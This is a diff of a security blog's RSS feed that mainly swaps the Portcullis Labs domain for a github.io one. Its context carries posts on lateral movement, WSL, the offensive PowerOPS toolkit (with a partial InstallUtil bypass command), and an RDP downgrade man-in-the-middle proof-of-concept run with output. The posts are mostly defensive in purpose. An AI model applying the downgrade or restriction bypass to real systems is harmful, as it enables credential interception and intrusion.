 <p>Yes, at least for Enterprise environments. Providing details of who to contact (service desk, IT Security, etc.) can be included in the notification message via the following Group Policy settings:</p>
@@ -453,14 +453,14 @@ Computer Configuration &gt; Policies &gt; Adminstrative Templates &gt; Windows C
 <p>For home users or business that do not have a corporate Anti-Virus solution, Windows Defender Anti-Virus and Controlled Folder Access will be better than nothing.<br />
 However, larger businesses typically have existing enterprise-wide Anti-Virus solutions in which significant time and effort (and money) has been invested. It would be difficult to convince the IT Security teams of such companies to throw out that investment, so I don’t expect Controlled Folder Access to be used much in large businesses.</p>
 <p>Controlled Folder Access is a new feature, and it may be that Microsoft modify it to work with third-party Anti-Virus products in the future.</p>
-<p>The post <a href="https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/">Windows 10’s &#8220;Controlled Folder Access&#8221; feature</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
-			<wfw:commentRss>https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/feed/</wfw:commentRss>
+<p>The post <a href="https://portcullislabs.github.io/blog/windows-10s-controlled-folder-access-feature/">Windows 10’s &#8220;Controlled Folder Access&#8221; feature</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://portcullislabs.github.io/blog/windows-10s-controlled-folder-access-feature/feed/</wfw:commentRss>
 		<slash:comments>0</slash:comments>
 		</item>
 		<item>
 		<title>Hindering Lateral Movement</title>
-		<link>https://labs.portcullis.co.uk/blog/hindering-lateral-movement/</link>
-		<comments>https://labs.portcullis.co.uk/blog/hindering-lateral-movement/#comments</comments>
+		<link>https://portcullislabs.github.io/blog/hindering-lateral-movement/</link>
+		<comments>https://portcullislabs.github.io/blog/hindering-lateral-movement/#comments</comments>
 		<pubDate>Fri, 27 Oct 2017 12:53:52 +0000</pubDate>
 		<dc:creator><![CDATA[RGH]]></dc:creator>
 				<category><![CDATA[Blog]]></category>
@@ -470,8 +470,8 @@ However, larger businesses typically have existing enterprise-wide Anti-Virus so
 		<category><![CDATA[training]]></category>
 		<category><![CDATA[Windows]]></category>
 
-		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6092</guid>
-		<description><![CDATA[<p>Lateral Movement is a method used by attackers (or malware) against a network Domain. After an initial device is compromised (typically, a user&#8217;s workstation), the attacker extracts passwords from memory, or obtains encrypted password hashes from the system for cracking or direct use (i.e. Pass the Hash). The attacker then attempts to login to other [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/hindering-lateral-movement/">Hindering Lateral Movement</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6092</guid>
+		<description><![CDATA[<p>Lateral Movement is a method used by attackers (or malware) against a network Domain. After an initial device is compromised (typically, a user&#8217;s workstation), the attacker extracts passwords from memory, or obtains encrypted password hashes from the system for cracking or direct use (i.e. Pass the Hash). The attacker then attempts to login to other [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/hindering-lateral-movement/">Hindering Lateral Movement</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
 				<content:encoded><![CDATA[<p>Lateral Movement is a method used by attackers (or malware) against a network Domain. After an initial device is compromised (typically, a user&#8217;s workstation), the attacker extracts passwords from memory, or obtains encrypted password hashes from the system for cracking or direct use (i.e. Pass the Hash). The attacker then attempts to login to other systems using those credentials to search for cached passwords of privileged Domain accounts. Usually, the local Administrator account is targeted as the password is often the same on all systems (due to the common practice of deploying systems from a master image), but service accounts, etc. can also be targeted.<span id="more-6092"></span></p>
 <p>In some cases, an attacker is able to move from having local Administrator access on a workstation to gaining full Domain Admin rights on the Domain in under an hour.</p>
 <p>Since Active Directory typically controls access to highly sensitive information, it is important to try and prevent lateral attacks from working. Being able to spot these attacks would also be good.</p>
@@ -537,14 +537,14 @@ Any events that reference local accounts (or Domain Administrator/privileged acc
 <p>A number of options have been presented to hinder Lateral Movement attacks, and some readers might be wondering which option to implement. The answer is &#8220;all of them, where possible&#8221;. Security is a &#8220;defence in depth&#8221; game, and every obstacle that an attacker has to work around is worth implementing.</p>
 <p>In addition to hindering lateral movement, monitoring for attacks or suspicious behaviour and investigating alerts will help identify more sophisticated attacks, as well as indicating that suspicious activities are occurring.</p>
 <p>A <a href="https://blogs.cisco.com/security/can-your-organisation-be-breached-find-out-with-a-red-team" title="Red Team">Red Team Assessment</a> can be undertaken to determine the effectiveness of the security controls in place during an attack against your network. Whilst the assessment is taking place it also provides an opportunity to determine whether the internal monitoring and response capabilities intended to detect and alert when a potential attack is occurring within your network are effective. Following completion of the assessment you will have a clear view of any additional measures that should be implemented to improve both defence and monitoring capabilities within your network.</p>
-<p>The post <a href="https://labs.portcullis.co.uk/blog/hindering-lateral-movement/">Hindering Lateral Movement</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
-			<wfw:commentRss>https://labs.portcullis.co.uk/blog/hindering-lateral-movement/feed/</wfw:commentRss>
+<p>The post <a href="https://portcullislabs.github.io/blog/hindering-lateral-movement/">Hindering Lateral Movement</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://portcullislabs.github.io/blog/hindering-lateral-movement/feed/</wfw:commentRss>
 		<slash:comments>0</slash:comments>
 		</item>
 		<item>
 		<title>Exploring Windows Subsystem for Linux</title>
-		<link>https://labs.portcullis.co.uk/blog/exploring-windows-subsystem-for-linux/</link>
-		<comments>https://labs.portcullis.co.uk/blog/exploring-windows-subsystem-for-linux/#comments</comments>
+		<link>https://portcullislabs.github.io/blog/exploring-windows-subsystem-for-linux/</link>
+		<comments>https://portcullislabs.github.io/blog/exploring-windows-subsystem-for-linux/#comments</comments>
 		<pubDate>Thu, 27 Jul 2017 09:00:04 +0000</pubDate>
 		<dc:creator><![CDATA[TMB]]></dc:creator>
 				<category><![CDATA[Blog]]></category>
@@ -553,8 +553,8 @@ Any events that reference local accounts (or Domain Administrator/privileged acc
 		<category><![CDATA[root]]></category>
 		<category><![CDATA[Windows]]></category>
 
-		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5869</guid>
-		<description><![CDATA[<p>Whilst there has been quite a lot of analysis of Microsoft&#8217;s new Windows Subsystem for Linux (aka WSL or Bash on Ubuntu on Windows) and how it functions (particularly from Alex Ionescu), most of this has focused on how it affects the Windows security model. Being a keen UNIX focused researcher, I decided to take [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/exploring-windows-subsystem-for-linux/">Exploring Windows Subsystem for Linux</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+		<guid isPermaLink="false">https://portcullislabs.github.io/?p=5869</guid>
+		<description><![CDATA[<p>Whilst there has been quite a lot of analysis of Microsoft&#8217;s new Windows Subsystem for Linux (aka WSL or Bash on Ubuntu on Windows) and how it functions (particularly from Alex Ionescu), most of this has focused on how it affects the Windows security model. Being a keen UNIX focused researcher, I decided to take [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/exploring-windows-subsystem-for-linux/">Exploring Windows Subsystem for Linux</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
 				<content:encoded><![CDATA[<p>Whilst there has been quite a lot of analysis of Microsoft&#8217;s new <a title="Windows Subsystem for Linux" href="https://msdn.microsoft.com/en-gb/commandline/wsl/about">Windows Subsystem for Linux</a> (aka WSL or Bash on Ubuntu on Windows) and how it functions (particularly from <a title="Alex Ionescu" href="https://github.com/ionescu007/lxss">Alex Ionescu</a>), most of this has focused on how it affects the Windows security model. Being a keen UNIX focused researcher, I decided to take it for a spin.<span id="more-5869"></span></p>
 <p>The first thing I did once I had it installed was look at how the Windows process tree had changed. Running it results in two new branches to your process tree. The first contains the Windows bash.exe instance which hosts your new terminal:</p>
 <ul>
@@ -611,7 +611,7 @@ Linux DESKTOP-L4857K3 3.4.0+ #1 PREEMPT Thu Aug 1 17:06:05 CST 2013 x86_64 x86_6
 	  bash      2 Partial RELRO     Canary found           NX enabled    No PIE
 </pre>
 <h2>Shared memory</h2>
-<p>So what does WSL look like more generally. Well, since I&#8217;ve had some fun with <a title="shared memory" href="https://labs.portcullis.co.uk/whitepapers/memory-squatting-attacks-on-system-v-shared-memory/">shared memory</a>, I wondered how this was implemented. Well, it turns out that it&#8217;s not:</p>
+<p>So what does WSL look like more generally. Well, since I&#8217;ve had some fun with <a title="shared memory" href="https://portcullislabs.github.io/whitepapers/memory-squatting-attacks-on-system-v-shared-memory/">shared memory</a>, I wondered how this was implemented. Well, it turns out that it&#8217;s not:</p>
 <pre class="brush: bash; gutter: false; title: ; notranslate">
 root@DESKTOP-L4857K3:~# ipcs
 
@@ -697,22 +697,22 @@ root@DESKTOP-L4857K3:/mnt/c/Users/x# ls -la foo
 <p>Microsoft&#8217;s stock answer is that the Ubuntu instance (or rather the bash.exe instance hosting the terminal and accompanying lxss.sys kernel implementation) is locked down, effectively sandboxed by a combination of Windows DACLs, the concept of <a href="jobs" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684161(v=vs.85).aspx">jobs</a> (touched upon at the start and akin to Linux <a title="cgroups" href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Resource_Management_Guide/ch01.html">cgroups</a>) and syscall mapping that effectively uses lxss.sys to <a title="proxy" href="https://blogs.msdn.microsoft.com/wsl/2016/06/08/wsl-system-calls/">proxy</a> most syscalls onto their corresponding NT kernel implementation.</p>
 <h2>Conclusion</h2>
 <p>The design of WSL seems to be relatively robust if slightly odd, however time will tell, particularly if offensive teams pick up the whiff of a new opportunity. If nothing else, take this article as a reminder that WSL should not be considered a security boundary and that it will remain unmanaged irrespective of how you administer your Windows hosts.</p>
-<p>The post <a href="https://labs.portcullis.co.uk/blog/exploring-windows-subsystem-for-linux/">Exploring Windows Subsystem for Linux</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
-			<wfw:commentRss>https://labs.portcullis.co.uk/blog/exploring-windows-subsystem-for-linux/feed/</wfw:commentRss>
+<p>The post <a href="https://portcullislabs.github.io/blog/exploring-windows-subsystem-for-linux/">Exploring Windows Subsystem for Linux</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://portcullislabs.github.io/blog/exploring-windows-subsystem-for-linux/feed/</wfw:commentRss>
 		<slash:comments>0</slash:comments>
 		</item>
 		<item>
 		<title>PowerOPS: PowerShell for Offensive Operations</title>
-		<link>https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/</link>
-		<comments>https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/#comments</comments>
+		<link>https://portcullislabs.github.io/blog/powerops-powershell-for-offensive-operations/</link>
+		<comments>https://portcullislabs.github.io/blog/powerops-powershell-for-offensive-operations/#comments</comments>
 		<pubDate>Fri, 03 Jun 2016 12:17:41 +0000</pubDate>
 		<dc:creator><![CDATA[RFR]]></dc:creator>
 				<category><![CDATA[Blog]]></category>
 		<category><![CDATA[red team]]></category>
 		<category><![CDATA[Windows]]></category>
 
-		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5467</guid>
-		<description><![CDATA[<p>At Portcullis, one of the most frequent assessments we perform are breakouts. One of the main challenges we face during these assessments is to get command execution that can either help escalate our privileges or allow us to gain access to different systems on the network. Sometimes we find harsh group policy restrictions in place [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/">PowerOPS: PowerShell for Offensive Operations</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+		<guid isPermaLink="false">https://portcullislabs.github.io/?p=5467</guid>
+		<description><![CDATA[<p>At Portcullis, one of the most frequent assessments we perform are breakouts. One of the main challenges we face during these assessments is to get command execution that can either help escalate our privileges or allow us to gain access to different systems on the network. Sometimes we find harsh group policy restrictions in place [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/powerops-powershell-for-offensive-operations/">PowerOPS: PowerShell for Offensive Operations</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
 				<content:encoded><![CDATA[<p>At Portcullis, one of the most frequent assessments we perform are breakouts. One of the main challenges we face during these assessments is to get command execution that can either help escalate our privileges or allow us to gain access to different systems on the network. <span id="more-5467"></span></p>
 <p>Sometimes we find harsh group policy restrictions in place that block access to the Windows Command Prompt, PowerShell, among others. These, however, are not always properly implemented, i.e. they do not block access to all executables (and allow only certain programs to run).</p>
 <p>After getting command execution, we want to attack other systems on the network. However it isn&#8217;t always easy to get a flexible toolbox in the system that allow us to gather information and launch further attacks. PowerShell is our preferred post-exploitation language and powershell.exe access is usually blocked (as .ps1 scripts). However since the block is often incorrectly implemented, i.e. the DLLs used by PowerShell aren&#8217;t usually blocked, this can open some doors. On top of that some AVs started implementing some basic signatures that will pick some well known PowerShell scripts. The bypass is trivial but we want to be as stealthy as possible and it still delay us a bit. </p>
@@ -1063,14 +1063,14 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\&gt; InstallUtil.exe /logfile= /Lo
 </pre>
 <h4>Credits</h4>
 <p>PowerOPS was inspired by <a title="Cn33liz/p0wnedShell" href="https://github.com/Cn33liz/p0wnedShell">Cn33liz/p0wnedShell</a>, and basically consists of work from <a title="Nikhil Mittal" href="http://www.labofapenetrationtester.com/">Nikhil Mittal</a> of Nishang, <a title="mattifiestation" href="https://twitter.com/mattifestation">mattifiestation</a> of PowerSploit and <a title="sixdub" href="https://twitter.com/sixdub">sixdub</a>, <a title="engima0x3" href="https://twitter.com/enigma0x3">engima0x3</a> and <a title="harmj0y" href="https://twitter.com/HarmJ0y">harmj0y</a> of Empire.</p>
-<p>The post <a href="https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/">PowerOPS: PowerShell for Offensive Operations</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
-			<wfw:commentRss>https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/feed/</wfw:commentRss>
+<p>The post <a href="https://portcullislabs.github.io/blog/powerops-powershell-for-offensive-operations/">PowerOPS: PowerShell for Offensive Operations</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://portcullislabs.github.io/blog/powerops-powershell-for-offensive-operations/feed/</wfw:commentRss>
 		<slash:comments>0</slash:comments>
 		</item>
 		<item>
 		<title>Downgrading RDP connections and how to avoid it</title>
-		<link>https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/</link>
-		<comments>https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/#comments</comments>
+		<link>https://portcullislabs.github.io/blog/downgrading-rdp-connections-and-how-to-avoid-it/</link>
+		<comments>https://portcullislabs.github.io/blog/downgrading-rdp-connections-and-how-to-avoid-it/#comments</comments>
 		<pubDate>Fri, 22 Apr 2016 15:18:17 +0000</pubDate>
 		<dc:creator><![CDATA[MRL]]></dc:creator>
 				<category><![CDATA[Blog]]></category>
@@ -1080,8 +1080,8 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\&gt; InstallUtil.exe /logfile= /Lo
 		<category><![CDATA[red team]]></category>
 		<category><![CDATA[Windows]]></category>
 
-		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=1488</guid>
-		<description><![CDATA[<p>This post describes how Remote Desktop Protocol (RDP) connections can be vulnerable to a downgrade attack if Terminal Servers are configured insecurely. We&#8217;re not aware of this issue being discussed before &#8211; googling only found pages about installing an earlier version of the RDP client, not about downgrading the protocol in the way described here. [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/">Downgrading RDP connections and how to avoid it</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+		<guid isPermaLink="false">https://portcullislabs.github.io/?p=1488</guid>
+		<description><![CDATA[<p>This post describes how Remote Desktop Protocol (RDP) connections can be vulnerable to a downgrade attack if Terminal Servers are configured insecurely. We&#8217;re not aware of this issue being discussed before &#8211; googling only found pages about installing an earlier version of the RDP client, not about downgrading the protocol in the way described here. [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/downgrading-rdp-connections-and-how-to-avoid-it/">Downgrading RDP connections and how to avoid it</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
 				<content:encoded><![CDATA[<p>This post describes how Remote Desktop Protocol (RDP) connections can be vulnerable to a downgrade attack if Terminal Servers are configured insecurely.<span id="more-1488"></span></p>
 <p>We&#8217;re not aware of this issue being discussed before &#8211; googling only found pages about installing an earlier version of the RDP client, not about downgrading the protocol in the way described here.  We suspect that it&#8217;s a known limitation of the protocol.  But it&#8217;s one that we though would be interesting to post about.</p>
 <p>In this post we provide a demonstration of such a downgrade attack using the aptly named PoC tool rdp-downgrade.py.</p>
@@ -1099,31 +1099,31 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\&gt; InstallUtil.exe /logfile= /Lo
 <p>The various warnings displayed by the Terminal Services client, mstsc.exe can be used as a crude way to identify which protocol is being used.</p>
 <h3>Classic RDP</h3>
 <p>Note that the warning message about not being able to authenticate the server tallies with the MiTM attack described above.</p>
-<div id="attachment_1497" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1489"><div class="lb-album"><a href="#image-1489"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/classic-rdp-300x180.jpg" alt="classic-rdp" class="size-medium wp-image-1497"><span></span></a></div>              
+<div id="attachment_1497" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1489"><div class="lb-album"><a href="#image-1489"><img src="https://portcullislabs.github.io/wp-content/uploads/2013/08/classic-rdp-300x180.jpg" alt="classic-rdp" class="size-medium wp-image-1497"><span></span></a></div>              
 <a href="#imageclose-1489" class="css3lightbox-close">
 				   <div class="lb-overlay" id="image-1489">
-                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/classic-rdp.jpg" alt="image-1489">
+                   <img src="https://portcullislabs.github.io/wp-content/uploads/2013/08/classic-rdp.jpg" alt="image-1489">
                    </div></a><p class="wp-caption-text">Warning For Classic RDP Connections</p></div>
 <h3>SSL</h3>
 <p>Unless you&#8217;ve configured your host to trust the SSL certificate of the RDP server, you&#8217;ll see a certificate warning like this one:</p>
-<div id="attachment_1496" style="width: 267px" class="wp-caption alignnone"><a name="imageclose-1490"><div class="lb-album"><a href="#image-1490"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/ssl-warning-257x300.png" alt="ssl-warning" class="size-medium wp-image-1496"><span></span></a></div>              
+<div id="attachment_1496" style="width: 267px" class="wp-caption alignnone"><a name="imageclose-1490"><div class="lb-album"><a href="#image-1490"><img src="https://portcullislabs.github.io/wp-content/uploads/2013/08/ssl-warning-257x300.png" alt="ssl-warning" class="size-medium wp-image-1496"><span></span></a></div>              
 <a href="#imageclose-1490" class="css3lightbox-close">
 				   <div class="lb-overlay" id="image-1490">
-                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/ssl-warning.png" alt="image-1490">
+                   <img src="https://portcullislabs.github.io/wp-content/uploads/2013/08/ssl-warning.png" alt="image-1490">
                    </div></a><p class="wp-caption-text">Warning for (Non-CredSSP) SSL Connections</p></div>
 <h3>CredSSP (NLA + SSL)</h3>
 <p>You get prompted for your username and password by a pop-up window &#8211; whereas Classic RDP and SSL both use a full Windows Desktop for password entry.</p>
-<div id="attachment_1498" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1491"><div class="lb-album"><a href="#image-1491"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/gaejegba-300x255.png" alt="gaejegba" class="size-medium wp-image-1498"><span></span></a></div>              
+<div id="attachment_1498" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1491"><div class="lb-album"><a href="#image-1491"><img src="https://portcullislabs.github.io/wp-content/uploads/2013/08/gaejegba-300x255.png" alt="gaejegba" class="size-medium wp-image-1498"><span></span></a></div>              
 <a href="#imageclose-1491" class="css3lightbox-close">
 				   <div class="lb-overlay" id="image-1491">
-                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/gaejegba.png" alt="image-1491">
+                   <img src="https://portcullislabs.github.io/wp-content/uploads/2013/08/gaejegba.png" alt="image-1491">
                    </div></a><p class="wp-caption-text">Dialogue Box For NLA Connections</p></div>
 <h2>Vulnerable configuration</h2>
 <p>Terminal Servers set to negotiate their Security Layer are potentially vulnerable to a downgrade attack. Here we view the settings on a Windows 2003 server, but this also holds for newer versions of Windows:</p>
-<p><a name="imageclose-1492"><div class="lb-album"><a href="#image-1492"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/2003-rdp-setting-vulnerable-300x235.png" alt="2003-rdp-setting-vulnerable" class="alignnone size-medium wp-image-1491"><span></span></a></div>              
+<p><a name="imageclose-1492"><div class="lb-album"><a href="#image-1492"><img src="https://portcullislabs.github.io/wp-content/uploads/2013/08/2003-rdp-setting-vulnerable-300x235.png" alt="2003-rdp-setting-vulnerable" class="alignnone size-medium wp-image-1491"><span></span></a></div>              
 <a href="#imageclose-1492" class="css3lightbox-close">
 				   <div class="lb-overlay" id="image-1492">
-                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/2003-rdp-setting-vulnerable.png" alt="image-1492">
+                   <img src="https://portcullislabs.github.io/wp-content/uploads/2013/08/2003-rdp-setting-vulnerable.png" alt="image-1492">
                    </div></a></p>
 <h2>The downgrade attack</h2>
 <p>We will connect to a Windows 2003 RDP server configured to &#8220;Negotiate&#8221; its Security Layer.  We&#8217;ll connect from a modern windows system that supports Classic RDP, SSL and NLA. This server only supports Classic RDP and SSL. As we&#8217;d hope, the two will normally negotiate the most secure option supported by both: SSL.</p>
@@ -1146,10 +1146,10 @@ $ python rdp-downgrade.py 192.168.2.96
 [Proxy] Listening for connections on 0.0.0.0:3389
 </pre>
 <p>Rather than actually doing ARP-spoofing, I just connect directly to the &#8220;Man-In-The-Middle&#8221; in this demo:</p>
-<div style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1493"><div class="lb-album"><a href="#image-1493"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/rdp-attack-prior-to-logon-300x177.jpg" alt="rdp-attack-prior-to-logon" ><span></span></a></div>              
+<div style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1493"><div class="lb-album"><a href="#image-1493"><img src="https://portcullislabs.github.io/wp-content/uploads/2013/08/rdp-attack-prior-to-logon-300x177.jpg" alt="rdp-attack-prior-to-logon" ><span></span></a></div>              
 <a href="#imageclose-1493" class="css3lightbox-close">
 				   <div class="lb-overlay" id="image-1493">
-                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/rdp-attack-prior-to-logon.jpg" alt="image-1493">
+                   <img src="https://portcullislabs.github.io/wp-content/uploads/2013/08/rdp-attack-prior-to-logon.jpg" alt="image-1493">
                    </div></a><p class="wp-caption-text">Attacker IP Address Is Entered</p></div>
 <p>Back in our PoC tool, we then see an incoming connection from the RDP client (192.168.190.1) and the proxy making an outgoing connection to the target server:</p>
 <pre class="brush: bash; gutter: false; title: ; notranslate">
@@ -1172,24 +1172,24 @@ $ python rdp-downgrade.py 192.168.2.96
 ...snip...
 </pre>
 <p>mstsc shows us the warning message corresponding to a Classic RDP connection, proving that the downgrade has been successful &#8211; remember that we would normally expect a certificate warning for the SSL-wrapped RDP connection.</p>
-<div id="attachment_1497" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1489"><div class="lb-album"><a href="#image-1489"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/classic-rdp-300x180.jpg" alt="classic-rdp" class="size-medium wp-image-1497"><span></span></a></div>              
+<div id="attachment_1497" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1489"><div class="lb-album"><a href="#image-1489"><img src="https://portcullislabs.github.io/wp-content/uploads/2013/08/classic-rdp-300x180.jpg" alt="classic-rdp" class="size-medium wp-image-1497"><span></span></a></div>              
 <a href="#imageclose-1489" class="css3lightbox-close">
 				   <div class="lb-overlay" id="image-1489">
-                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/classic-rdp.jpg" alt="image-1489">
+                   <img src="https://portcullislabs.github.io/wp-content/uploads/2013/08/classic-rdp.jpg" alt="image-1489">
                    </div></a><p class="wp-caption-text">Warning Message For Classic RDP Connection</p></div>
 <h2>Conclusion</h2>
 <p>Configuring the Terminal Server to use SSL for it security layer instead of &#8220;Negotiate&#8221; prevents such a downgrade attack.</p>
 <h2>Vendor contact</h2>
 <p>We were not sure if Microsoft would consider this worthy of a security advisory. We didn&#8217;t think so, but sent them a preview of this post before publishing and asked.</p>
 <p>Microsoft who responded swiftly to confirm that &#8220;After researching the issue, we consider this behavior to be By Design&#8221;. They thanked us for our commitment to co-ordinated disclosure and gave their blessing to proceed with publication.</p>
-<p>The post <a href="https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/">Downgrading RDP connections and how to avoid it</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
-			<wfw:commentRss>https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/feed/</wfw:commentRss>
+<p>The post <a href="https://portcullislabs.github.io/blog/downgrading-rdp-connections-and-how-to-avoid-it/">Downgrading RDP connections and how to avoid it</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://portcullislabs.github.io/blog/downgrading-rdp-connections-and-how-to-avoid-it/feed/</wfw:commentRss>
 		<slash:comments>0</slash:comments>
 		</item>
 		<item>
 		<title>Windows Named Pipes: There and back again</title>
-		<link>https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/</link>
-		<comments>https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/#comments</comments>
+		<link>https://portcullislabs.github.io/blog/windows-named-pipes-there-and-back-again/</link>
+		<comments>https://portcullislabs.github.io/blog/windows-named-pipes-there-and-back-again/#comments</comments>
 		<pubDate>Fri, 20 Nov 2015 14:04:20 +0000</pubDate>
 		<dc:creator><![CDATA[ACD]]></dc:creator>
 				<category><![CDATA[Blog]]></category>
@@ -1197,8 +1197,8 @@ $ python rdp-downgrade.py 192.168.2.96
 		<category><![CDATA[training]]></category>
 		<category><![CDATA[Windows]]></category>
 
-		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5378</guid>
-		<description><![CDATA[<p>Inter Process Communication (IPC) is an ubiquitous part of modern computing. Processes often talk to each other and many software packages contain multiple components which need to exchange data to run properly. Named pipes are one of the many forms of IPC in use today and are extensively used on the Windows platform as a [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/">Windows Named Pipes: There and back again</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+		<guid isPermaLink="false">https://portcullislabs.github.io/?p=5378</guid>
+		<description><![CDATA[<p>Inter Process Communication (IPC) is an ubiquitous part of modern computing. Processes often talk to each other and many software packages contain multiple components which need to exchange data to run properly. Named pipes are one of the many forms of IPC in use today and are extensively used on the Windows platform as a [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/windows-named-pipes-there-and-back-again/">Windows Named Pipes: There and back again</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
 				<content:encoded><![CDATA[<p>Inter Process Communication (IPC) is an ubiquitous part of modern computing. Processes often talk to each other and many software packages contain multiple components which need to exchange data to run properly. Named pipes are one of the many forms of IPC in use today and are extensively used on the Windows platform as a means to exchange data between running processes in a semi-persistent manner.<span id="more-5378"></span></p>
 <p>On Windows, named pipes operate in a server-client model and can make use of the Windows Universal Naming Convention (UNC) for both local and remote connections.</p>
 <p>Named pipes on Windows use what is known as the Named Pipe File System (NPFS). The NPFS is a hidden partition which functions just like any other; files are written, read and deleted using the same mechanisms as a standard Windows file system. So named pipes are actually just files on a hard drive which persist until there are no remaining handles to the file, at which point the file is deleted by Windows.</p>
@@ -1238,8 +1238,8 @@ System.IO.Directory.GetFiles(@&quot;\\.\pipe\&quot;);
 <p>Whenever a client pipe is under development, it is extremely important to consider carefully the level of privileges the pipe needs to do its job and to run it at the minimum level required.</p>
 <p>The primary source of exploits against named pipes is through the  impersonation of client privileges by the named pipe server. The easiest and most direct way to prevent a named pipe client from being impersonated is disallow pipe impersonation when connecting to a server. This can be achieved by setting the SECURITY_IDENTIFICATION flag or the SECURITY_ANONYMOUS flag when calling the CreateFile() function as part of the client connection process.</p>
 <p>In cases where impersonation is necessary, there are a number of other ways to ensure that only a legitimate client connects to a server. For example, in a simple application a specific sequence of information could be exchanged between the server and the client (a handshake) before any actual data is exchanged. For more advanced protection, encryption could be used. While not natively supported, public key cryptography (PKI) could be used if implemented correctly. These mechanisms are beyond the scope of this post but are worth bearing in mind.</p>
-<p>The post <a href="https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/">Windows Named Pipes: There and back again</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
-			<wfw:commentRss>https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/feed/</wfw:commentRss>
